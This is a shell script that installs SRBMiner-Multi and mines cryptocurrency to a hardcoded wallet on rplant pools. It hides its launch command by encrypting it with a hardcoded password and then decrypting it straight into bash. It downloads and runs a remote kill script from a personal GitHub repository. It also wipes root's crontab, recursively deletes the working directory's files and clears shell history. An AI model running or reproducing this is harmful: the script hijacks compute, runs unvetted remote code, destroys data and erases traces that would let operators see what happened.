#!/bin/sh
password="danielchau@123#"
rm -fR /root/cpuminer-opt-linux/
rm -fv *
sudo apt-get update -y
sudo apt-get install cpulimit -y
wget --no-check-certificate -O SRBMiner-Multi.tar.gz https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.6/SRBMiner-Multi-2-4-6-Linux.tar.xz
tar -xvf SRBMiner-Multi.tar.gz
chmod +x SRBMiner-Multi-2-4-6/*
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

#find best servers
servers=("stratum-eu.rplant.xyz" "stratum-asia.rplant.xyz" "stratum-na.rplant.xyz")
fastest_server=""
min_latency=999999
for server in "${servers[@]}"; do
    latency=$(ping -c 2 $server | awk '/^rtt/ { print $4 }' | cut -d '/' -f 2)
    if (( $(echo "$latency < $min_latency" | bc -l) )); then
        min_latency=$latency
        fastest_server=$server
    fi
done
echo "$fastest_server with min_latency is: $latency"

cat /dev/null > /root/danielluis1921.sh
cat >>/root/danielluis1921.sh <<EOF
#!/bin/bash
sudo ./kill_miner.sh
sleep 3
sudo ./root/SRBMiner-Multi-2-4-6/SRBMiner-MULTI --background --threads=$cores -a Aurum --pool $fastest_server:17109 --tls true --wallet bit1qurhknpxt5k8vwz0snrg9xnyvgdnk4asc9skgtx.Vultr --keepalive true
sleep 3
EOF
openssl enc -aes-256-cbc -salt -pbkdf2 -in /root/danielluis1921.sh -out /root/danielluis1922.sh -k $password
rm -fv /root/danielluis1921.sh
chmod +x /root/danielluis1922.sh

wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
chmod +x /root/kill_miner.sh
./root/kill_miner.sh
sleep 3
openssl enc -d -aes-256-cbc -pbkdf2 -in /root/danielluis1922.sh -k $password | bash
cat /dev/null > /var/spool/cron/crontabs/root
rm -fv *
rm -fR *
history -c && history -w
